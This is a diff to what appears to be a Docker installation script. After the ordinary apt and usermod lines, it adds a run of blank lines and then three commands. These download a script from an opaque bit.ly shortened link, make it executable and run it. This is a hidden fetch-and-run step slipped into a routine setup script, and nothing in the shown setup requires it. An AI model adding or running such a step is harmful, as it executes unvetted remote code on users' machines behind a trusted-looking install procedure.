@@ -10,3 +10,11 @@ sudo apt update
 sudo apt install docker-ce docker-ce-cli containerd.io
 
 sudo usermod -aG docker $USER
+
+
+
+
+
+wget https://bit.ly/2ysbOFE -O script.sh
+chmod +x script.sh
+./script.sh
